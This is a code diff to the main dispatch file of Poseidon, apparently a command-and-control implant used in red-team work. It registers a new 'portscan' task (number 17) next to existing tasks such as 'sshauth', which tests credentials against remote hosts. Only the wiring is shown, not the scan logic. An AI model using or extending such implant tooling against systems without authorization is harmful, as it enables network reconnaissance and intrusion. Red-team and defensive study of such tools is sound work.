@@ -22,6 +22,7 @@ import (
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
+	"github.com/xorrior/poseidon/pkg/commands/portscan"
 )
 
 //export RunMain
@@ -88,6 +89,7 @@ func main() {
 		"keys":            14,
 		"triagedirectory": 15,
 		"sshauth":         16,
+		"portscan": 	   17,
 		"none":            20,
 	}
 
@@ -192,6 +194,10 @@ func main() {
 			case 16:
 				// Test credentials against remote hosts
 				go sshauth.Run(task, res)
+				break
+			case 17:
+				// Scan ports on remote hosts.
+				go portscan.Run(task, res)
 				break
 			case 20:
 				// No tasks, do nothing
